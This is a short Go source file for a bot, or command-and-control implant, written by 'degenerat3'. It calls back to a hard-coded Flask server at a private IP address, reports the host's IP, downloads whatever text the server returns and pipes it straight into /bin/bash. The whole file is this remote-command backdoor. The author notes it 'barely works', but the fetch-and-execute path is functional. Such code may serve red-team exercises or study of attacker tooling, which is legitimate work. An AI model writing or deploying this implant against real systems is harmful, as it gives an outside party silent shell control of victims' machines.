// Golang bot to pull commands from webserver and execute them
// Disclaimer: This barely works
// @author: degenerat3

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
)

var serv = "192.168.58.132:5000" //IP of flask serv
var src = "GoBin"                // where is this calling back from
var loopTime = 10                //sleep time in secs

// get hostname and return it as a string
func getHn() string {
	hn, _ := os.Hostname()
	return hn
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/api/callback/" + ip + "/" + src
	r, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("commands: \n%s\n", txt)
	//exec.Command(string(txt))
	bsh := exec.Command("/bin/bash", "")
	var buffer bytes.Buffer
	buffer.Write([]byte(txt))

	bsh.Stdin = &buffer
	bsh.Run()
}

func main() {
	getCommands()

}
